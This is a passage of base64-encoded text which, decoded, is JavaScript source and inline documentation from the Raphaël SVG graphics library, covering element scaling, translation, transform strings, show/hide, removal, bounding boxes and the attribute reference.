3Rpb24gKHN4LCBzeSwgY3gsIGN5KSB7XG4gICAgICAgIGlmICh0aGlzLnJlbW92ZWQpIHtcbiAgICAgICAgICAgIHJldHVybiB0aGlzO1xuICAgICAgICB9XG4gICAgICAgIHN4ID0gU3RyKHN4KS5zcGxpdChzZXBhcmF0b3IpO1xuICAgICAgICBpZiAoc3gubGVuZ3RoIC0gMSkge1xuICAgICAgICAgICAgc3kgPSB0b0Zsb2F0KHN4WzFdKTtcbiAgICAgICAgICAgIGN4ID0gdG9GbG9hdChzeFsyXSk7XG4gICAgICAgICAgICBjeSA9IHRvRmxvYXQoc3hbM10pO1xuICAgICAgICB9XG4gICAgICAgIHN4ID0gdG9GbG9hdChzeFswXSk7XG4gICAgICAgIChzeSA9PSBudWxsKSAmJiAoc3kgPSBzeCk7XG4gICAgICAgIChjeSA9PSBudWxsKSAmJiAoY3ggPSBjeSk7XG4gICAgICAgIGlmIChjeCA9PSBudWxsIHx8IGN5ID09IG51bGwpIHtcbiAgICAgICAgICAgIHZhciBiYm94ID0gdGhpcy5nZXRCQm94KDEpO1xuICAgICAgICB9XG4gICAgICAgIGN4ID0gY3ggPT0gbnVsbCA/IGJib3gueCArIGJib3gud2lkdGggLyAyIDogY3g7XG4gICAgICAgIGN5ID0gY3kgPT0gbnVsbCA/IGJib3gueSArIGJib3guaGVpZ2h0IC8gMiA6IGN5O1xuICAgICAgICB0aGlzLnRyYW5zZm9ybSh0aGlzLl8udHJhbnNmb3JtLmNvbmNhdChbW1wic1wiLCBzeCwgc3ksIGN4LCBjeV1dKSk7XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQudHJhbnNsYXRlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBEZXByZWNhdGVkISBVc2UgQEVsZW1lbnQudHJhbnNmb3JtIGluc3RlYWQuXG4gICAgICogQWRkcyB0cmFuc2xhdGlvbiBieSBnaXZlbiBhbW91bnQgdG8gdGhlIGxpc3Qgb2YgdHJhbnNmb3JtYXRpb25zIG9mIHRoZSBlbGVtZW50LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBkeCAobnVtYmVyKSBob3Jpc29udGFsIHNoaWZ0XG4gICAgIC0gZHkgKG51bWJlcikgdmVydGljYWwgc2hpZnRcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnRyYW5zbGF0ZSA9IGZ1bmN0aW9uIChkeCwgZHkpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgZHggPSBTdHIoZHgpLnNwbGl0KHNlcGFyYXRvcik7XG4gICAgICAgIGlmIChkeC5sZW5ndGggLSAxKSB7XG4gICAgICAgICAgICBkeSA9IHRvRmxvYXQoZHhbMV0pO1xuICAgICAgICB9XG4gICAgICAgIGR4ID0gdG9GbG9hdChkeFswXSkgfHwgMDtcbiAgICAgICAgZHkgPSArZHkgfHwgMDtcbiAgICAgICAgdGhpcy50cmFuc2Zvcm0odGhpcy5fLnRyYW5zZm9ybS5jb25jYXQoW1tcInRcIiwgZHgsIGR5XV0pKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC50cmFuc2Zvcm1cbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFkZHMgdHJhbnNmb3JtYXRpb24gdG8gdGhlIGVsZW1lbnQgd2hpY2ggaXMgc2VwYXJhdGUgdG8gb3RoZXIgYXR0cmlidXRlcyxcbiAgICAgKiBpLmUuIHRyYW5zbGF0aW9uIGRvZXNu4oCZdCBjaGFuZ2UgYHhgIG9yIGB5YCBvZiB0aGUgcmVjdGFuZ2UuIFRoZSBmb3JtYXRcbiAgICAgKiBvZiB0cmFuc2Zvcm1hdGlvbiBzdHJpbmcgaXMgc2ltaWxhciB0byB0aGUgcGF0aCBzdHJpbmcgc3ludGF4OlxuICAgICB8IFwidDEwMCwxMDByMzAsMTAwLDEwMHMyLDIsMTAwLDEwMHI0NXMxLjVcIlxuICAgICAqIEVhY2ggbGV0dGVyIGlzIGEgY29tbWFuZC4gVGhlcmUgYXJlIGZvdXIgY29tbWFuZHM6IGB0YCBpcyBmb3IgdHJhbnNsYXRlLCBgcmAgaXMgZm9yIHJvdGF0ZSwgYHNgIGlzIGZvclxuICAgICAqIHNjYWxlIGFuZCBgbWAgaXMgZm9yIG1hdHJpeC5cbiAgICAgKlxuICAgICAqIFRoZXJlIGFyZSBhbHNvIGFsdGVybmF0aXZlIOKAnGFic29sdXRl4oCdIHRyYW5zbGF0aW9uLCByb3RhdGlvbiBhbmQgc2NhbGU6IGBUYCwgYFJgIGFuZCBgU2AuIFRoZXkgd2lsbCBub3QgdGFrZSBwcmV2aW91cyB0cmFuc2Zvcm1hdGlvbiBpbnRvIGFjY291bnQuIEZvciBleGFtcGxlLCBgLi4uVDEwMCwwYCB3aWxsIGFsd2F5cyBtb3ZlIGVsZW1lbnQgMTAwIHB4IGhvcmlzb250YWxseSwgd2hpbGUgYC4uLnQxMDAsMGAgY291bGQgbW92ZSBpdCB2ZXJ0aWNhbGx5IGlmIHRoZXJlIGlzIGByOTBgIGJlZm9yZS4gSnVzdCBjb21wYXJlIHJlc3VsdHMgb2YgYHI5MHQxMDAsMGAgYW5kIGByOTBUMTAwLDBgLlxuICAgICAqXG4gICAgICogU28sIHRoZSBleGFtcGxlIGxpbmUgYWJvdmUgY291bGQgYmUgcmVhZCBsaWtlIOKAnHRyYW5zbGF0ZSBieSAxMDAsIDEwMDsgcm90YXRlIDMwwrAgYXJvdW5kIDEwMCwgMTAwOyBzY2FsZSB0d2ljZSBhcm91bmQgMTAwLCAxMDA7XG4gICAgICogcm90YXRlIDQ1wrAgYXJvdW5kIGNlbnRyZTsgc2NhbGUgMS41IHRpbWVzIHJlbGF0aXZlIHRvIGNlbnRyZeKAnS4gQXMgeW91IGNhbiBzZWUgcm90YXRlIGFuZCBzY2FsZSBjb21tYW5kcyBoYXZlIG9yaWdpblxuICAgICAqIGNvb3JkaW5hdGVzIGFzIG9wdGlvbmFsIHBhcmFtZXRlcnMsIHRoZSBkZWZhdWx0IGlzIHRoZSBjZW50cmUgcG9pbnQgb2YgdGhlIGVsZW1lbnQuXG4gICAgICogTWF0cml4IGFjY2VwdHMgc2l4IHBhcmFtZXRlcnMuXG4gICAgID4gVXNhZ2VcbiAgICAgfCB2YXIgZWwgPSBwYXBlci5yZWN0KDEwLCAyMCwgMzAwLCAyMDApO1xuICAgICB8IC8vIHRyYW5zbGF0ZSAxMDAsIDEwMCwgcm90YXRlIDQ1wrAsIHRyYW5zbGF0ZSAtMTAwLCAwXG4gICAgIHwgZWwudHJhbnNmb3JtKFwidDEwMCwxMDByNDV0LTEwMCwwXCIpO1xuICAgICB8IC8vIGlmIHlvdSB3YW50IHlvdSBjYW4gYXBwZW5kIG9yIHByZXBlbmQgdHJhbnNmb3JtYXRpb25zXG4gICAgIHwgZWwudHJhbnNmb3JtKFwiLi4udDUwLDUwXCIpO1xuICAgICB8IGVsLnRyYW5zZm9ybShcInMyLi4uXCIpO1xuICAgICB8IC8vIG9yIGV2ZW4gd3JhcFxuICAgICB8IGVsLnRyYW5zZm9ybShcInQ1MCw1MC4uLnQtNTAtNTBcIik7XG4gICAgIHwgLy8gdG8gcmVzZXQgdHJhbnNmb3JtYXRpb24gY2FsbCBtZXRob2Qgd2l0aCBlbXB0eSBzdHJpbmdcbiAgICAgfCBlbC50cmFuc2Zvcm0oXCJcIik7XG4gICAgIHwgLy8gdG8gZ2V0IGN1cnJlbnQgdmFsdWUgY2FsbCBpdCB3aXRob3V0IHBhcmFtZXRlcnNcbiAgICAgfCBjb25zb2xlLmxvZyhlbC50cmFuc2Zvcm0oKSk7XG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHRzdHIgKHN0cmluZykgI29wdGlvbmFsIHRyYW5zZm9ybWF0aW9uIHN0cmluZ1xuICAgICAqIElmIHRzdHIgaXNu4oCZdCBzcGVjaWZpZWRcbiAgICAgPSAoc3RyaW5nKSBjdXJyZW50IHRyYW5zZm9ybWF0aW9uIHN0cmluZ1xuICAgICAqIGVsc2VcbiAgICAgPSAob2JqZWN0KSBARWxlbWVudFxuICAgIFxcKi9cbiAgICBlbHByb3RvLnRyYW5zZm9ybSA9IGZ1bmN0aW9uICh0c3RyKSB7XG4gICAgICAgIHZhciBfID0gdGhpcy5fO1xuICAgICAgICBpZiAodHN0ciA9PSBudWxsKSB7XG4gICAgICAgICAgICByZXR1cm4gXy50cmFuc2Zvcm07XG4gICAgICAgIH1cbiAgICAgICAgUi5fZXh0cmFjdFRyYW5zZm9ybSh0aGlzLCB0c3RyKTtcblxuICAgICAgICB0aGlzLmNsaXAgJiYgJCh0aGlzLmNsaXAsIHt0cmFuc2Zvcm06IHRoaXMubWF0cml4LmludmVydCgpfSk7XG4gICAgICAgIHRoaXMucGF0dGVybiAmJiB1cGRhdGVQb3NpdGlvbih0aGlzKTtcbiAgICAgICAgdGhpcy5ub2RlICYmICQodGhpcy5ub2RlLCB7dHJhbnNmb3JtOiB0aGlzLm1hdHJpeH0pO1xuXG4gICAgICAgIGlmIChfLnN4ICE9IDEgfHwgXy5zeSAhPSAxKSB7XG4gICAgICAgICAgICB2YXIgc3cgPSB0aGlzLmF0dHJzW2hhc10oXCJzdHJva2Utd2lkdGhcIikgPyB0aGlzLmF0dHJzW1wic3Ryb2tlLXdpZHRoXCJdIDogMTtcbiAgICAgICAgICAgIHRoaXMuYXR0cih7XCJzdHJva2Utd2lkdGhcIjogc3d9KTtcbiAgICAgICAgfVxuXG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuaGlkZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogTWFrZXMgZWxlbWVudCBpbnZpc2libGUuIFNlZSBARWxlbWVudC5zaG93LlxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIGVscHJvdG8uaGlkZSA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgaWYoIXRoaXMucmVtb3ZlZCkgdGhpcy5ub2RlLnN0eWxlLmRpc3BsYXkgPSBcIm5vbmVcIjtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5zaG93XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBNYWtlcyBlbGVtZW50IHZpc2libGUuIFNlZSBARWxlbWVudC5oaWRlLlxuICAgICA9IChvYmplY3QpIEBFbGVtZW50XG4gICAgXFwqL1xuICAgIGVscHJvdG8uc2hvdyA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgaWYoIXRoaXMucmVtb3ZlZCkgdGhpcy5ub2RlLnN0eWxlLmRpc3BsYXkgPSBcIlwiO1xuICAgICAgICByZXR1cm4gdGhpcztcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LnJlbW92ZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyBlbGVtZW50IGZyb20gdGhlIHBhcGVyLlxuICAgIFxcKi9cbiAgICBlbHByb3RvLnJlbW92ZSA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgdmFyIG5vZGUgPSBnZXRSZWFsTm9kZSh0aGlzLm5vZGUpO1xuICAgICAgICBpZiAodGhpcy5yZW1vdmVkIHx8ICFub2RlLnBhcmVudE5vZGUpIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgICAgICB2YXIgcGFwZXIgPSB0aGlzLnBhcGVyO1xuICAgICAgICBwYXBlci5fX3NldF9fICYmIHBhcGVyLl9fc2V0X18uZXhjbHVkZSh0aGlzKTtcbiAgICAgICAgZXZlLnVuYmluZChcInJhcGhhZWwuKi4qLlwiICsgdGhpcy5pZCk7XG4gICAgICAgIGlmICh0aGlzLmdyYWRpZW50KSB7XG4gICAgICAgICAgICBwYXBlci5kZWZzLnJlbW92ZUNoaWxkKHRoaXMuZ3JhZGllbnQpO1xuICAgICAgICB9XG4gICAgICAgIFIuX3RlYXIodGhpcywgcGFwZXIpO1xuXG4gICAgICAgIG5vZGUucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChub2RlKTtcblxuICAgICAgICAvLyBSZW1vdmUgY3VzdG9tIGRhdGEgZm9yIGVsZW1lbnRcbiAgICAgICAgdGhpcy5yZW1vdmVEYXRhKCk7XG5cbiAgICAgICAgZm9yICh2YXIgaSBpbiB0aGlzKSB7XG4gICAgICAgICAgICB0aGlzW2ldID0gdHlwZW9mIHRoaXNbaV0gPT0gXCJmdW5jdGlvblwiID8gUi5fcmVtb3ZlZEZhY3RvcnkoaSkgOiBudWxsO1xuICAgICAgICB9XG4gICAgICAgIHRoaXMucmVtb3ZlZCA9IHRydWU7XG4gICAgfTtcbiAgICBlbHByb3RvLl9nZXRCQm94ID0gZnVuY3Rpb24gKCkge1xuICAgICAgICBpZiAodGhpcy5ub2RlLnN0eWxlLmRpc3BsYXkgPT0gXCJub25lXCIpIHtcbiAgICAgICAgICAgIHRoaXMuc2hvdygpO1xuICAgICAgICAgICAgdmFyIGhpZGUgPSB0cnVlO1xuICAgICAgICB9XG4gICAgICAgIHZhciBjYW52YXNIaWRkZW4gPSBmYWxzZSxcbiAgICAgICAgICAgIGNvbnRhaW5lclN0eWxlO1xuICAgICAgICBpZiAodGhpcy5wYXBlci5jYW52YXMucGFyZW50RWxlbWVudCkge1xuICAgICAgICAgIGNvbnRhaW5lclN0eWxlID0gdGhpcy5wYXBlci5jYW52YXMucGFyZW50RWxlbWVudC5zdHlsZTtcbiAgICAgICAgfSAvL0lFMTArIGNhbid0IGZpbmQgcGFyZW50RWxlbWVudFxuICAgICAgICBlbHNlIGlmICh0aGlzLnBhcGVyLmNhbnZhcy5wYXJlbnROb2RlKSB7XG4gICAgICAgICAgY29udGFpbmVyU3R5bGUgPSB0aGlzLnBhcGVyLmNhbnZhcy5wYXJlbnROb2RlLnN0eWxlO1xuICAgICAgICB9XG5cbiAgICAgICAgaWYoY29udGFpbmVyU3R5bGUgJiYgY29udGFpbmVyU3R5bGUuZGlzcGxheSA9PSBcIm5vbmVcIikge1xuICAgICAgICAgIGNhbnZhc0hpZGRlbiA9IHRydWU7XG4gICAgICAgICAgY29udGFpbmVyU3R5bGUuZGlzcGxheSA9IFwiXCI7XG4gICAgICAgIH1cbiAgICAgICAgdmFyIGJib3ggPSB7fTtcbiAgICAgICAgdHJ5IHtcbiAgICAgICAgICAgIGJib3ggPSB0aGlzLm5vZGUuZ2V0QkJveCgpO1xuICAgICAgICB9IGNhdGNoKGUpIHtcbiAgICAgICAgICAgIC8vIEZpcmVmb3ggMy4wLngsIDI1LjAuMSAocHJvYmFibHkgbW9yZSB2ZXJzaW9ucyBhZmZlY3RlZCkgcGxheSBiYWRseSBoZXJlIC0gcG9zc2libGUgZml4XG4gICAgICAgICAgICBiYm94ID0ge1xuICAgICAgICAgICAgICAgIHg6IHRoaXMubm9kZS5jbGllbnRMZWZ0LFxuICAgICAgICAgICAgICAgIHk6IHRoaXMubm9kZS5jbGllbnRUb3AsXG4gICAgICAgICAgICAgICAgd2lkdGg6IHRoaXMubm9kZS5jbGllbnRXaWR0aCxcbiAgICAgICAgICAgICAgICBoZWlnaHQ6IHRoaXMubm9kZS5jbGllbnRIZWlnaHRcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSBmaW5hbGx5IHtcbiAgICAgICAgICAgIGJib3ggPSBiYm94IHx8IHt9O1xuICAgICAgICAgICAgaWYoY2FudmFzSGlkZGVuKXtcbiAgICAgICAgICAgICAgY29udGFpbmVyU3R5bGUuZGlzcGxheSA9IFwibm9uZVwiO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGhpZGUgJiYgdGhpcy5oaWRlKCk7XG4gICAgICAgIHJldHVybiBiYm94O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuYXR0clxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogU2V0cyB0aGUgYXR0cmlidXRlcyBvZiB0aGUgZWxlbWVudC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gYXR0ck5hbWUgKHN0cmluZykgYXR0cmlidXRl4oCZcyBuYW1lXG4gICAgIC0gdmFsdWUgKHN0cmluZykgdmFsdWVcbiAgICAgKiBvclxuICAgICAtIHBhcmFtcyAob2JqZWN0KSBvYmplY3Qgb2YgbmFtZS92YWx1ZSBwYWlyc1xuICAgICAqIG9yXG4gICAgIC0gYXR0ck5hbWUgKHN0cmluZykgYXR0cmlidXRl4oCZcyBuYW1lXG4gICAgICogb3JcbiAgICAgLSBhdHRyTmFtZXMgKGFycmF5KSBpbiB0aGlzIGNhc2UgbWV0aG9kIHJldHVybnMgYXJyYXkgb2YgY3VycmVudCB2YWx1ZXMgZm9yIGdpdmVuIGF0dHJpYnV0ZSBuYW1lc1xuICAgICA9IChvYmplY3QpIEBFbGVtZW50IGlmIGF0dHJzTmFtZSAmIHZhbHVlIG9yIHBhcmFtcyBhcmUgcGFzc2VkIGluLlxuICAgICA9ICguLi4pIHZhbHVlIG9mIHRoZSBhdHRyaWJ1dGUgaWYgb25seSBhdHRyc05hbWUgaXMgcGFzc2VkIGluLlxuICAgICA9IChhcnJheSkgYXJyYXkgb2YgdmFsdWVzIG9mIHRoZSBhdHRyaWJ1dGUgaWYgYXR0cnNOYW1lcyBpcyBwYXNzZWQgaW4uXG4gICAgID0gKG9iamVjdCkgb2JqZWN0IG9mIGF0dHJpYnV0ZXMgaWYgbm90aGluZyBpcyBwYXNzZWQgaW4uXG4gICAgID4gUG9zc2libGUgcGFyYW1ldGVyc1xuICAgICAjIDxwPlBsZWFzZSByZWZlciB0byB0aGUgPGEgaHJlZj1cImh0dHA6Ly93d3cudzMub3JnL1RSL1NWRy9cIiB0aXRsZT1cIlRoZSBXM0MgUmVjb21tZW5kYXRpb24gZm9yIHRoZSBTVkcgbGFuZ3VhZ2UgZGVzY3JpYmVzIHRoZXNlIHByb3BlcnRpZXMgaW4gZGV0YWlsLlwiPlNWRyBzcGVjaWZpY2F0aW9uPC9hPiBmb3IgYW4gZXhwbGFuYXRpb24gb2YgdGhlc2UgcGFyYW1ldGVycy48L3A+XG4gICAgIG8gYXJyb3ctZW5kIChzdHJpbmcpIGFycm93aGVhZCBvbiB0aGUgZW5kIG9mIHRoZSBwYXRoLiBUaGUgZm9ybWF0IGZvciBzdHJpbmcgaXMgYDx0eXBlPlstPHdpZHRoPlstPGxlbmd0aD5dXWAuIFBvc3NpYmxlIHR5cGVzOiBgY2xhc3NpY2AsIGBibG9ja2AsIGBvcGVuYCwgYG92YWxgLCBgZGlhbW9uZGAsIGBub25lYCwgd2lkdGg6IGB3aWRlYCwgYG5hcnJvd2AsIGBtZWRpdW1gLCBsZW5ndGg6IGBsb25nYCwgYHNob3J0YCwgYG1pZGl1bWAuXG4gICAgIG8gY2xpcC1yZWN0IChzdHJpbmcpIGNvbW1hIG9yIHNwYWNlIHNlcGFyYXRlZCB2YWx1ZXM6IHgsIHksIHdpZHRoIGFuZCBoZWlnaHRcbiAgICAgbyBjdXJzb3IgKHN0cmluZykgQ1NTIHR5cGUgb2YgdGhlIGN1cnNvclxuICAgICBvIGN4IChudW1iZXIpIHRoZSB4LWF4aXMgY29vcmRpbmF0ZSBvZiB0aGUgY2VudGVyIG9mIHRoZSBjaXJjbGUsIG9yIGVsbGlwc2VcbiAgICAgbyBjeSAobnVtYmVyKSB0aGUgeS1heGlzIGNvb3JkaW5hdGUgb2YgdGhlIGNlbnRlciBvZiB0aGUgY2lyY2xlLCBvciBlbGxpcHNlXG4gICAgIG8gZmlsbCAoc3RyaW5nKSBjb2xvdXIsIGdyYWRpZW50IG9yIGltYWdlXG4gICAgIG8gZmlsbC1vcGFjaXR5IChudW1iZXIpXG4gICAgIG8gZm9udCAoc3RyaW5nKVxuICAgICBvIGZvbnQtZmFtaWx5IChzdHJpbmcpXG4gICAgIG8gZm9udC1zaXplIChudW1iZXIpIGZvbnQgc2l6ZSBpbiBwaXhlbHNcbiAgICAgbyBmb250LXdlaWdodCAoc3RyaW5nKVxuICAgICBvIGhlaWdodCAobnVtYmVyKVxuICAgICBvIGhyZWYgKHN0cmluZykgVVJMLCBpZiBzcGVjaWZpZWQgZWxlbWVudCBiZWhhdmVzIGFzIGh5cGVybGlua1xuICAgICBvIG9wYWNpdHkgKG51bWJlcilcbiAgICAgbyBwYXRoIChzdHJpbmcpIFNWRyBwYXRoIHN0cmluZyBmb3JtYXRcbiAgICAgbyByIChudW1iZXIpIHJhZGl1cyBvZiB0aGUgY2lyY2xlLCBlbGxpcHNlIG9yIHJvdW5kZWQgY29ybmVyIG9uIHRoZSByZWN0XG4gICAgIG8gcnggKG51bWJlcikgaG9yaXNvbnRhbCByYWRpdXMgb2YgdGhlIGVsbGlwc2VcbiAgICAgbyByeSAobnVtYmVyKSB2ZXJ0aWNhbCByYWRpdXMgb2YgdGhlIGVsbGlwc2VcbiAgICAgbyBzcmMgKHN0cmluZykgaW1hZ2UgVVJMLCBvbmx5IHdvcmtzIGZvciBARWxlbWVudC5pbWFnZSBlbGVtZW50XG4gICAgIG8gc3Ryb2tlIChzdHJpbmcpIHN0cm9rZSBjb2xvdXJcbiAgICAgbyBzdHJva2UtZGFzaGFycmF5IChzdHJpbmcpIFvigJzigJ0sIOKAnG5vbmXigJ0sIOKAnGAtYOKAnSwg4oCcYC5g4oCdLCDigJxgLS5g4oCdLCDigJxgLS4uYOKAnSwg4oCcYC4gYOKAnSwg4oCcYC0gYOKAnSwg4oCcYC0tYOKAnSwg4oCcYC0gLmDigJ0sIOKAnGAtLS5g4oCdLCDigJxgLS0uLmDigJ1dXG4gICAgIG8gc3Ryb2tlLWxpbmVjYXAgKHN0cmluZykgW+KAnGBidXR0YOKAnSwg4oCcYHNxdWFyZWDigJ0sIOKAnGByb3VuZGDigJ1dXG4gICAgIG8gc3Ryb2tlLWxpbmVqb2luIChzdHJpbmcpIFvigJxgYmV2ZWxg4oCdLCDigJxgcm91bmRg4oCdLCDigJxgbWl0ZXJg4oCdXVxuICAgICBvIHN0cm9rZS1taXRlcmxpbWl0IChudW1iZXIpXG4gICAgIG8gc3Ryb2tlLW9wYWNpdHkgKG51bWJlcilcbiAgICAgbyBzdHJva2Utd2lkdGggKG51bWJlcikgc3Ryb2tlIHdpZHRoIGluIHBpeGVscywgZGVmYXVsdCBpcyAnMSdcbiAgICAgbyB0YXJnZXQgKHN0cmluZykgdXNlZCB3aXRoIGhyZWZcbiAgICAgbyB0ZXh0IChzdHJpbmcpIGNvbnRlbnRzIG9mIHRoZSB0ZXh0IGVsZW1lbnQuIFVzZSBgXFxuYCBmb3IgbXVsdGlsaW5lIHRleHRcbiAgICAgbyB0ZXh0LWFuY2hvciAoc3RyaW5nKSBb4oCcYHN0YXJ0YOKAnSwg4oCcYG1pZGRsZWDigJ0sIOKAnGBlbmRg4oCdXSwgZGVmYXVsdCBpcyDigJxgbWlkZGxlYOKAnVxuICAgICBvIHRpdGxlIChzdHJpbmcpIHdpbGwgY3JlYXRlIHRvb2x0aXAgd2l0aCBhIGdpdmVuIHRleHRcbiAgICAgbyB0cmFuc2Zvcm0gKHN0cmluZykgc2VlIEBFbGVtZW50LnRyYW5zZm9ybVxuICAgICBvIHdpZHRoIChudW1iZXIpXG4gICAgIG8geCAobnVtYmVyKVxuICAgICBvIHkgKG51bWJlcilcbiAgICAgPiBHcmFkaWVudHNcbiAgICAgKiBMaW5lYXIgZ3JhZGllbnQgZm9ybWF0OiDigJxg4oC5YW5nbGXigLot4oC5Y29sb3Vy4oC6Wy3igLljb2xvdXLigLpbOuKAuW9mZnNldOKAul1dKi3igLljb2xvdXLigLpg4oCdLCBleGFtcGxlOiDigJxgOTAtI2ZmZi0jMDAwYOKAnSDigJMgOTDCsFxuICAgICAqIGdyYWRpZW50IGZyb20gd2hpdGUgdG8gYmxhY2sgb3Ig4oCcYDAtI2ZmZi0jZjAwOjIwLSMwMDBg4oCdIOKAkyAwwrAgZ3JhZGllbnQgZnJvbSB3aGl0ZSB2aWEgcmVkIChhdCAyMCUpIHRvIGJsYWNrLlxuICAgICAqXG4gICAgICogcmFkaWFsIGdyYWRpZW50OiDigJxgclso4oC5ZnjigLosIOKAuWZ54oC6KV3igLljb2xvdXLigLpbLeKAuWNvbG91cuKAuls64oC5b2Zmc2V04oC6XV0qLeKAuWNvbG91cuKAumDigJ0sIGV4YW1wbGU6IOKAnGByI2ZmZi0jMDAwYOKAnSDigJNcbiAgICAgKiBncmFkaWVudCBmcm9tIHdoaXRlIHRvIGJsYWNrIG9yIOKAnGByKDAuMjUsIDAuNzUpI2ZmZi0jMDAwYOKAnSDigJMgZ3JhZGllbnQgZnJvbSB3aGl0ZSB0byBibGFjayB3aXRoIGZvY3VzIHBvaW50XG4gICAgICogYXQgMC4yNSwgMC43NS4gRm9jdXMgcG9pbnQgY29vcmRpbmF0ZXMgYXJlIGluIDAuLjEgcmFuZ2UuIFJhZGlhbCBncmFkaWVudHMgY2FuIG9ubHkgYmUgYXBwbGllZCB0byBjaXJjbGVzIGFuZCBlbGxpcHNlcy5cbiAgICAgPiBQYXRoIFN0cmluZ1xuICAgICAjIDxwPlBsZWFzZSByZWZlciB0byA8YSBocmVmPVwiaHR0cDovL3d3dy53My5vcmcvVFIvU1ZHL3BhdGhzLmh0bWwjUGF0aERhdGFcIiB0aXRsZT1cIkRldGFpbHMgb2YgYSBwYXRo4oCZcyBkYXRhIGF0dHJpYnV0ZeKAmXMgZm9ybWF0IGFyZSBkZXNjcmliZWQgaW4gdGhlIFNWRyBzcGVjaWZpY2F0aW9uLlwiPlNWRyBkb2N1bWVudGF0aW9uIHJlZ2FyZGluZyBwYXRoIHN0cmluZzwvYT4uIFJhcGhhw6tsIGZ1bGx5IHN1cHBvcnRzIGl0LjwvcD5cbiAgICAgPiBDb2xvdXIgUGFyc2luZ1xuICAgICAjIDx1bD5cbiAgICAgIyAgICAgPGxpPkNvbG91ciBuYW1lICjigJw8Y29kZT5yZWQ8L2NvZGU+4oCdLCDigJw8Y29kZT5ncmVlbjwvY29kZT7igJ0sIOKAnDxjb2RlPmNvcm5mbG93ZXJibHVlPC9jb2RlPuKAnSwgZXRjKTwvbGk+XG4gICAgICMgICAgIDxsaT4j4oCi4oCi4oCiIOKAlCBzaG9ydGVuZWQgSFRNTCBjb2xvdXI6ICjigJw8Y29kZT4jMDAwPC9jb2RlPuKAnSwg4oCcPGNvZGU+I2ZjMDwvY29kZT7igJ0sIGV0Yyk8L2xpPlxuICAgICAjICAgICA8bGk+I+KAouKAouKAouKAouKAouKAoiDigJQgZnVsbCBsZW5ndGggSFRNTCBjb2xvdXI6ICjigJw8Y29kZT4jMDAwMDAwPC9jb2RlPuKAnSwg4oCcPGNvZGU+I2JkMjMwMDwvY29kZT7igJ0pPC9saT5cbiAgICAgIyAgICAgPGxpPnJnYijigKLigKLigKIsIOKAouKAouKAoiwg4oCi4oCi4oCiKSDigJQgcmVkLCBncmVlbiBhbmQgYmx1ZSBjaGFubmVsc+KAmSB2YWx1ZXM6ICjigJw8Y29kZT5yZ2IoMjAwLCZuYnNwOzEwMCwmbmJzcDswKTwvY29kZT7igJ0pPC9saT5cbiAgICAgIyAgICAgPGxpPnJnYijigKLigKLigKIlLCDigKLigKLigKIlLCDigKLigKLigKIlKSDigJQgc2FtZSBhcyBhYm92ZSwgYnV0IGluICU6ICjigJw8Y29kZT5yZ2IoMTAwJSwmbmJzcDsxNzUlLCZuYnNwOzAlKTwvY29kZT7igJ0pPC9saT5cbiAgICAgIyAgICAgPGxpPnJnYmEo4oCi4oCi4oCiLCDigKLigKLigKIsIOKAouKAouKAoiwg4oCi4oCi4oCiKSDigJQgcmVkLCBncmVlbiBhbmQgYmx1ZSBjaGFubmVsc+KAmSB2YWx1ZXM6ICjigJw8Y29kZT5yZ2JhKDIwMCwmbmJzcDsxMDAsJm5ic3A7MCwgLjUpPC9jb2RlPuKAnSk8L2xpPlxuICAgICAjICAgICA8bGk+cmdiYSjigKLigKLigKIlLCDigKLigKLigKIlLCDigKLigKLigKIlLCDigKLigKLigKIlKSDigJQgc2FtZSBhcyBhYm92ZSwgYnV0IGluICU6ICjigJw8Y29kZT5yZ2JhKDEwMCUsJm5ic3A7MTc1JSwmbmJzcDswJSwgNTAlKTwvY29kZT7igJ0pPC9saT5cbiAgICAgIyAgICAgPGxpPmhzYijigKLigKLigKIsIOKAouKAouKAoiwg4oCi4oCi4oCiKSDigJQgaHVlLCBzYXR1cmF0aW9uIGFuZCBicmlnaHRuZXNzIHZhbHVlczogKOKAnDxjb2RlPmhzYigwLjUsJm5ic3A7MC4yNSwmbmJzcDsxKTwvY29kZT7igJ0pPC9saT5cbiAgICAgIyAgICAgPGxpPmhzYijigKLigKLigKIlLCDigKLigKLigKIlLCDigKLigKLigKIlKSDigJQgc2FtZSBhcyBhYm92ZSwgYnV0IGluICU8L2xpPlxuICAgICAjICAgICA8bGk+aHNiYSjigKLigKLigKIsIOKAouKAouKAoiwg4oCi4oCi4oCiLCDigKLigKLigKIpIOKAlCBzYW1lIGFzIGFib3ZlLCBidXQgd2l0aCBvcGFjaXR5PC9saT5cbiAgICAgIyAgICAgPGxpPmh